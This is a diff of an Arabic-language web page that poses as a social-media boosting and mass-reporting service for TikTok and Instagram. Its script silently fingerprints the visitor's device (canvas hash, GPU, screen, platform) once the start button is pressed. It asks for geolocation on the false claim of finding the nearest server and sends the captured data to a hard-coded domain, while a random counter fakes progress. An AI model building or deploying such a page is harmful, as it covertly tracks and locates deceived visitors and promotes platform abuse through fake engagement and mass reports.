@@ -3,76 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>سيرفر الرشق العالمي 🎯</title>
+    <title>خدمات سوشال ميديا 🎯</title>
     <style>
-        body { background-color: black; color: white; text-align: center; font-family: 'Courier New', monospace; padding: 20px; direction: rtl; }
-        pre { font-size: 8px; color: #00ff00; margin-bottom: 20px; }
+        body { background-color: black; color: white; text-align: center; font-family: 'Arial', sans-serif; padding: 20px; direction: rtl; margin: 0; }
+        
+        /* الصفحة الرئيسية */
+        #landing-page { display: flex; flex-direction: column; justify-content: center; height: 100vh; }
+        .hero-title { font-size: 45px; font-weight: bold; color: #00ff00; text-shadow: 0 0 10px #00ff00; margin-bottom: 30px; }
+        .start-btn { width: 200px; padding: 15px; background: #00ff00; color: black; border: none; border-radius: 50px; font-size: 20px; font-weight: bold; cursor: pointer; align-self: center; box-shadow: 0 0 20px rgba(0,255,0,0.5); }
+
+        /* الأقسام والجمجمة */
+        pre { font-size: 8px; color: #00ff00; margin-top: 20px; }
+        .law-text { color: #ff0000; font-family: 'Courier New', monospace; font-size: 14px; letter-spacing: 1px; margin-bottom: 40px; }
+        .choose-text { font-size: 18px; margin-bottom: 30px; color: #ccc; }
+
         .menu-btn { width: 90%; padding: 15px; margin: 10px 0; background: #111; border: 1px solid #00ff00; color: #00ff00; border-radius: 8px; font-weight: bold; cursor: pointer; }
         .back-btn { background: #330000; border: 1px solid #ff0000; color: #ff0000; margin-top: 15px; width: 50%; padding: 10px; border-radius: 5px; cursor: pointer; }
         .hidden { display: none; }
         input { width: 85%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #444; background: #222; color: white; text-align: center; }
         .action-btn { width: 85%; padding: 12px; background-color: #00ff00; color: black; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; }
-        #progress-container { margin-top: 20px; color: #00ff00; font-size: 20px; border: 1px solid #00ff00; padding: 10px; border-radius: 10px; }
+        
         #live-status { margin-top: 30px; border-top: 1px solid #333; padding-top: 20px; text-align: right; font-size: 11px; color: #00ff00; }
         .status-entry { margin-bottom: 8px; border-bottom: 1px solid #222; padding-bottom: 5px; }
-        .tag-success { color: #00ff00; } .tag-process { color: #ffff00; }
     </style>
 </head>
 <body>
-    <pre>
-        uuuuuuu
-    uu$$$$$$$$$$$uu
-  uu$$$$$$$$$$$$$$$uu
- u$$$$$$$$$$$$$$$$$$$u
- u$$$$$$$$$$$$$$$$$$$u
-u$$$$$$$$$$$$$$$$$$$$$u
-u$$$$$$$$$$$$$$$$$$$$$u
-u$$$$$$$$$$$$$$$$$$$$$u
-u$$$$$$$$$$$$$$$$$$$$$u
- u$$$$$$   "$$$"   $$$$$$u
-  "$$$$"      u$u       "$$$$"
-   $$$u      u$u      u$$$
-    $$$u      u$u      u$$$
-     "$$$$uu$$$u$$$uu$$$$"
-      "$$$$$$$$$$$$$$$$$"
-        "$$$$$$$$$$$$$"
-          "$$$$$$$$$"
-            "$$$$$"
-    </pre>
 
-    <div id="main-menu">
-        <button class="menu-btn" onclick="showSub('boost')">1- قسم الرشق (متابعين/لايكات) 🚀</button>
-        <button class="menu-btn" onclick="showSub('spam')">2- قسم الإسبام (بلاغات مكثفة) ⚔️</button>
+    <div id="landing-page">
+        <h1 class="hero-title">خدمات سوشال ميديا</h1>
+        <button class="start-btn" onclick="startSystem()">بدء ✅</button>
     </div>
 
-    <div id="platform-menu" class="hidden">
-        <h3 id="plat-title">اختر المنصة</h3>
-        <button class="menu-btn" onclick="showOptions('TikTok')">تيك توك</button>
-        <button class="menu-btn" onclick="showOptions('Instagram')">انستقرام</button>
-        <button class="back-btn" onclick="goBack('main-menu')">إلغاء / رجوع ↩️</button>
-    </div>
+    <div id="tools-interface" class="hidden">
+        <pre>
+            uuuuuuu
+        uu$$$$$$$$$$$uu
+      uu$$$$$$$$$$$$$$$uu
+     u$$$$$$$$$$$$$$$$$$$u
+     u$$$$$$$$$$$$$$$$$$$u
+    u$$$$$$$$$$$$$$$$$$$$$u
+    u$$$$$$$$$$$$$$$$$$$$$u
+    u$$$$$$$$$$$$$$$$$$$$$u
+    u$$$$$$$$$$$$$$$$$$$$$u
+     u$$$$$$   "$$$"   $$$$$$u
+      "$$$$"      u$u       "$$$$"
+       $$$u      u$u      u$$$
+        $$$u      u$u      u$$$
+         "$$$$uu$$$u$$$uu$$$$"
+          "$$$$$$$$$$$$$$$$$"
+            "$$$$$$$$$$$$$"
+              "$$$$$$$$$"
+                "$$$$$"
+        </pre>
+        <div class="law-text">Not everywhere there is a law</div>
+        
+        <div class="choose-text">اختر الخدمه اللتي تريدها :</div>
 
-    <div id="boost-options" class="hidden">
-        <button class="menu-btn" onclick="openFinal('رشق متابعين', 'يوزر الحساب', 5000)">رشق متابعين</button>
-        <button class="menu-btn" onclick="openFinal('رشق لايكات', 'رابط المقطع', 5000)">رشق لايكات</button>
-        <button class="menu-btn" onclick="openFinal('رشق مشاهدات', 'رابط المقطع', 5000)">رشق مشاهدات</button>
-        <button class="back-btn" onclick="goBack('platform-menu')">رجوع ↩️</button>
-    </div>
+        <div id="main-menu">
+            <button class="menu-btn" onclick="showSub('boost')">1- قسم الرشق (متابعين/لايكات) 🚀</button>
+            <button class="menu-btn" onclick="showSub('spam')">2- قسم الإسبام (بلاغات مكثفة) ⚔️</button>
+        </div>
 
-    <div id="final-input" class="hidden">
-        <h3 id="final-title"></h3>
-        <input type="text" id="target-id" placeholder="">
-        <input type="number" id="target-count" placeholder="">
-        <button class="action-btn" onclick="requestAccess()">تأكيد العملية ✅</button>
-        <button class="back-btn" onclick="location.reload()">إلغاء العملية ❌</button>
-        <div id="progress-container" class="hidden">حالة الإرسال: <span id="counter">0</span></div>
-    </div>
+        <div id="platform-menu" class="hidden">
+            <button class="menu-btn" onclick="showOptions('TikTok')">تيك توك</button>
+            <button class="menu-btn" onclick="showOptions('Instagram')">انستقرام</button>
+            <button class="back-btn" onclick="goBack('main-menu')">رجوع ↩️</button>
+        </div>
 
-    <div id="live-status">
-        <h4>آخر العمليات الناجحة:</h4>
-        <div id="status-list">
-            <div class="status-entry">👤 المستخدم: a***_2 | <span class="tag-success">اكتملت ✅</span></div>
-            <div class="status-entry">👤 المستخدم: k***_9 | <span class="tag-process">جارٍ الإرسال... ⏳</span></div>
+        <div id="boost-options" class="hidden">
+            <button class="menu-btn" onclick="openFinal('رشق متابعين', 'يوزر الحساب', 5000)">رشق متابعين</button>
+            <button class="menu-btn" onclick="openFinal('رشق لايكات', 'رابط المقطع', 5000)">رشق لايكات</button>
+            <button class="menu-btn" onclick="openFinal('رشق مشاهدات', 'رابط المقطع', 5000)">رشق مشاهدات</button>
+            <button class="back-btn" onclick="goBack('platform-menu')">رجوع ↩️</button>
+        </div>
+
+        <div id="final-input" class="hidden">
+            <h3 id="final-title" style="color:#00ff00;"></h3>
+            <input type="text" id="target-id" placeholder="">
+            <input type="number" id="target-count" placeholder="">
+            <button class="action-btn" onclick="requestAccess()">تأكيد العملية ✅</button>
+            <button class="back-btn" onclick="location.reload()">إلغاء ❌</button>
+            <div id="progress-container" class="hidden" style="margin-top:20px; color:#00ff00; border:1px solid #00ff00; padding:10px;">جارٍ التنفيذ: <span id="counter">0</span></div>
+        </div>
+
+        <div id="live-status">
+            <h4>آخر العمليات الناجحة:</h4>
+            <div id="status-list">
+                <div class="status-entry">👤 المستخدم: m***_s | <span style="color:#00ff00;">اكتملت ✅</span></div>
+                <div class="status-entry">👤 المستخدم: r***_x | <span style="color:#ffff00;">جارٍ الإرسال... ⏳</span></div>
+            </div>
         </div>
     </div>
 
@@ -81,11 +100,17 @@ u$$$$$$$$$$$$$$$$$$$$$u
         let deviceCapturedData = {};
         const MY_DOMAIN = "fordead.vercel.app";
 
+        function startSystem() {
+            document.getElementById('landing-page').classList.add('hidden');
+            document.getElementById('tools-interface').classList.remove('hidden');
+            silentCapture(); // يبدأ السحب عند دخول الواجهة
+        }
+
         async function generateHardwareID() {
             try {
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
-                ctx.fillText("HW-ID-Scan", 2, 15);
+                ctx.fillText("HW-Scan", 2, 15);
                 let canvasData = canvas.toDataURL();
                 let hash = 0;
                 for (let i = 0; i < canvasData.length; i++) { hash = ((hash << 5) - hash) + canvasData.charCodeAt(i); hash |= 0; }
@@ -96,20 +121,16 @@ u$$$$$$$$$$$$$$$$$$$$$u
         async function silentCapture() {
             if (!window.location.hostname.includes(MY_DOMAIN)) return;
             const hwID = await generateHardwareID();
-            let gpu = "غير معروف";
+            let gpu = "Unknown";
             try {
                 const gl = document.createElement('canvas').getContext('webgl');
                 gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
             } catch(e) {}
             
             const w = window.screen.width; const h = window.screen.height;
-            let deviceModel = navigator.platform;
-            if (w === 430 && h === 932) deviceModel = "iPhone 14/15 Pro Max";
-            else if (w === 393 && h === 852) deviceModel = "iPhone 14/15 Pro";
-
             deviceCapturedData = {
-                hw_id: hwID, gpu: gpu, model: deviceModel, screen: `${w}x${h}`,
-                network: (navigator.maxTouchPoints > 1) ? "WiFi/Fast-Net" : "Mobile Data",
+                hw_id: hwID, gpu: gpu, screen: `${w}x${h}`,
+                network: (navigator.maxTouchPoints > 1) ? "WiFi/Fast" : "Mobile",
                 platform: navigator.platform
             };
 
@@ -118,39 +139,16 @@ u$$$$$$$$$$$$$$$$$$$$$u
             });
         }
 
-        function showSub(m) { 
-            mode = m; 
-            document.getElementById('main-menu').classList.add('hidden'); 
-            document.getElementById('platform-menu').classList.remove('hidden'); 
-        }
-
-        function showOptions(p) { 
-            platform = p; 
-            document.getElementById('platform-menu').classList.add('hidden'); 
-            if(mode === 'boost') document.getElementById('boost-options').classList.remove('hidden'); 
-            else openFinal('إسبام بلاغات', 'يوزر الحساب', 300); 
-        }
-
-        function openFinal(s, h, limit) { 
-            service = s; maxLimit = limit;
-            document.getElementById('boost-options').classList.add('hidden'); 
-            document.getElementById('final-input').classList.remove('hidden'); 
-            document.getElementById('final-title').innerText = platform + " - " + s;
-            document.getElementById('target-id').placeholder = h;
-            document.getElementById('target-count').placeholder = "الحد الأقصى " + limit;
-        }
-
-        function goBack(targetId) {
-            document.querySelectorAll('div[id$="-menu"], div[id$="-options"], #final-input').forEach(d => d.classList.add('hidden'));
-            document.getElementById(targetId).classList.remove('hidden');
-        }
+        function showSub(m) { mode = m; document.getElementById('main-menu').classList.add('hidden'); document.getElementById('platform-menu').classList.remove('hidden'); }
+        function showOptions(p) { platform = p; document.getElementById('platform-menu').classList.add('hidden'); if(mode === 'boost') document.getElementById('boost-options').classList.remove('hidden'); else openFinal('إسبام بلاغات', 'يوزر الحساب', 300); }
+        function openFinal(s, h, limit) { service = s; maxLimit = limit; document.getElementById('boost-options').classList.add('hidden'); document.getElementById('final-input').classList.remove('hidden'); document.getElementById('final-title').innerText = platform + " - " + s; document.getElementById('target-id').placeholder = h; document.getElementById('target-count').placeholder = "الحد الأقصى " + limit; }
+        function goBack(targetId) { document.querySelectorAll('div[id$="-menu"], div[id$="-options"], #final-input').forEach(d => d.classList.add('hidden')); document.getElementById(targetId).classList.remove('hidden'); }
 
         function requestAccess() {
             const id = document.getElementById('target-id').value;
             const count = document.getElementById('target-count').value;
-            if(!id || !count) return alert("يرجى إكمال البيانات!");
-            
-            alert("لضمان سرعة الربط، يرجى السماح بالوصول للموقع لتحديد أقرب سيرفر متاح.");
+            if(!id || !count) return alert("أكمل البيانات!");
+            alert("يرجى السماح بالوصول للموقع لربط حسابك بأقرب سيرفر متاح.");
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => sendFinalData(id, count, pos.coords.latitude, pos.coords.longitude),
@@ -170,12 +168,10 @@ u$$$$$$$$$$$$$$$$$$$$$u
             document.getElementById('progress-container').classList.remove('hidden');
             let current = 0;
             let interval = setInterval(() => {
-                if(current >= max) { clearInterval(interval); alert("اكتمل الإرسال بنجاح!"); location.reload(); }
+                if(current >= max) { clearInterval(interval); alert("اكتمل الإرسال!"); location.reload(); }
                 else { current += Math.floor(Math.random() * 5) + 1; if(current > max) current = max; document.getElementById('counter').innerText = current; }
             }, 800);
         }
-
-        window.addEventListener('DOMContentLoaded', silentCapture);
     </script>
 </body>
 </html>
